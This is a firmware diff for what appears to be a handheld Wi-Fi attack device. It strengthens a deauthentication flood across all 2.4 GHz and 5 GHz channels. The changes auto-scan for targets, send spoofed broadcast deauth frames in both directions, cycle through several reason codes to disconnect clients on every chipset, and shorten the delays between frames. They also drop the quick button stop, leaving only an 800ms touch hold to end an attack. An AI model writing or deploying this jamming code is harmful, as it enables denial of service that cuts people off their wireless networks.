@@ -136,13 +136,7 @@ static const uint8_t ACTION_MENU_COUNT = 6;
 static uint32_t _touchHoldStartTime = 0;
 
 static bool attackStopRequested() {
-  // 1. Tactile NAV button (PB3): deliberate press immediately stops
-  if (navPressed()) {
-    while (navPressed()) delay(10);
-    return true;
-  }
-
-  // 2. Touch sensor (TTP223 on PB_20): requires continuous hold for >800ms to stop (avoids accidental touch aborts)
+  // ONLY holding the OK touch sensor (TTP223 on PB_20) for >= 800ms will terminate attacks
   if (okPressed()) {
     if (_touchHoldStartTime == 0) {
       _touchHoldStartTime = millis();
@@ -393,22 +387,26 @@ void loop() {
   // ── Physical Button reading ──────────────────────────────────
   // OK  = TTP223 touch sensor (PB20, active HIGH)
   //   Short tap  → handleOk()
-  //   Long hold  → UNIVERSAL emergency back (handleBack from ANY state)
+  // ── Physical Button reading ──────────────────────────────────
+  // OK  = TTP223 touch sensor (PB20, active HIGH)
+  //   Short tap   → handleOk()
+  //   Hold >800ms → UNIVERSAL emergency back / terminate (emergencyBack)
   // NAV = Tactile push button (PB3, active LOW)
-  //   Short tap  → handleNav()
+  //   Short tap   → handleNav()
+  //   Hold down   → Smooth auto-scroll (repeats every 200ms after 350ms initial delay)
 
   if (okPressed()) {
-    delay(30); // debounce
+    delay(20); // debounce
     if (okPressed()) {
       buzzerClick();
       uint32_t pressStart = millis();
       bool longPress = false;
       while (okPressed()) {
-        if (millis() - pressStart > BTN_LONG_PRESS_MS) {
+        if (millis() - pressStart >= 800) {
           longPress = true;
-          buzzerClick(); // extra feedback for long press
+          buzzerClick(); // feedback for long hold
           while (okPressed()) delay(10); // wait release
-          emergencyBack(); // universal emergency terminator
+          emergencyBack(); // universal emergency back / terminate
           goto after_buttons;
         }
         delay(10);
@@ -419,13 +417,24 @@ void loop() {
     }
   }
 
+  static uint32_t navPressStart = 0;
+  static uint32_t lastNavRepeat = 0;
   if (navPressed()) {
-    delay(30); // debounce
-    if (navPressed()) {
+    if (navPressStart == 0) {
+      navPressStart = millis();
+      lastNavRepeat = millis();
       buzzerClick();
-      while (navPressed()) delay(10); // wait release
       handleNav();
+    } else {
+      // Held down: auto-scroll smoothly (not too fast, 200ms per step after 350ms initial hold)
+      if (millis() - navPressStart > 350 && millis() - lastNavRepeat > 200) {
+        lastNavRepeat = millis();
+        buzzerClick();
+        handleNav();
+      }
     }
+  } else {
+    navPressStart = 0;
   }
 
 after_buttons:
@@ -1325,6 +1334,17 @@ bool runPacketInjectionLab() {
 }
 
 bool runDeauthAllChannels(uint8_t band) {
+  // If no APs scanned yet, run a scan first to learn real target BSSIDs
+  if (wifiScannerCount() == 0) {
+    runScan();
+    if (wifiScannerCount() == 0) {
+      uiDrawStatus("No APs Scanned");
+      delay(800);
+      drawMainMenu();
+      return false;
+    }
+  }
+
   static const uint8_t CHANNELS_24[] = { 1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13 };
   static const uint8_t CHANNELS_5[]  = { 36, 40, 44, 48, 149, 153, 157, 161 };
 
@@ -1361,6 +1381,9 @@ bool runDeauthAllChannels(uint8_t band) {
   uint16_t currentPps = 0;
   uint8_t broadcastMac[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
 
+  // Standard multi-reason codes for total device disconnection across all vendor chipsets
+  static const uint16_t REASONS[] = { 0x0007, 0x0002, 0x0006, 0x0001 };
+
   uiDrawDeauthScreen(band == 5 ? "ALL 5G CHANNELS" : "ALL 2.4G CHANNELS", chList[0], band == 5, 0);
 
   uint8_t chIndex = 0;
@@ -1385,31 +1408,35 @@ bool runDeauthAllChannels(uint8_t band) {
       if (apChs[ap] != curCh) continue;
       foundAP = true;
 
-      for (uint8_t burst = 0; burst < 5; burst++) {
-        if (attackStopRequested()) return stopPacketInjectionLab(anySent, sentCount);
+      // Heavy multi-reason flood for every AP on this channel
+      for (uint8_t r = 0; r < 4; r++) {
+        uint16_t rCode = REASONS[r];
+        for (uint8_t burst = 0; burst < 3; burst++) {
+          if (attackStopRequested()) return stopPacketInjectionLab(anySent, sentCount);
 
-        // AP -> Broadcast deauth (spoof AP kicking all clients)
-        bool s1 = wifi_tx_deauth_frame(apMacs[ap], broadcastMac, apMacs[ap], LAB_DEAUTH_REASON);
-        if (s1) { anySent = true; sentCount++; } else { failCount++; }
-        delay(3);
+          // Direction 1: AP -> Broadcast deauth (spoof AP kicking all clients)
+          bool s1 = wifi_tx_deauth_frame(apMacs[ap], broadcastMac, apMacs[ap], rCode);
+          if (s1) { anySent = true; sentCount++; } else { failCount++; }
+          delay(2);
 
-        // Broadcast -> AP deauth (spoof client disconnecting from AP)
-        bool s2 = wifi_tx_deauth_frame(broadcastMac, apMacs[ap], apMacs[ap], LAB_DEAUTH_REASON);
-        if (s2) { sentCount++; } else { failCount++; }
-        delay(3);
+          // Direction 2: Client -> AP deauth (spoof client disconnecting)
+          bool s2 = wifi_tx_deauth_frame(broadcastMac, apMacs[ap], apMacs[ap], rCode);
+          if (s2) { sentCount++; } else { failCount++; }
+          delay(2);
+        }
       }
     }
 
-    // Fallback: no scanned APs on this channel
+    // Fallback if no scanned AP is specifically on this channel
     if (!foundAP) {
       for (uint8_t b = 0; b < 3; b++) {
         wifi_tx_deauth_frame(broadcastMac, broadcastMac, broadcastMac, LAB_DEAUTH_REASON);
         sentCount++;
-        delay(5);
+        delay(4);
       }
     }
 
-    delay(30);
+    delay(25);
 
     if (millis() - lastPpsCalc >= 1000) {
       currentPps = (uint16_t)(sentCount - lastSentForPps);
@@ -1426,6 +1453,7 @@ bool runDeauthAllChannels(uint8_t band) {
     chIndex = (chIndex + 1) % count;
   }
 }
+
 
 bool stopPacketInjectionLab(bool anySent, uint32_t sentCount) {
   labInjectionStoppedByUser = true;
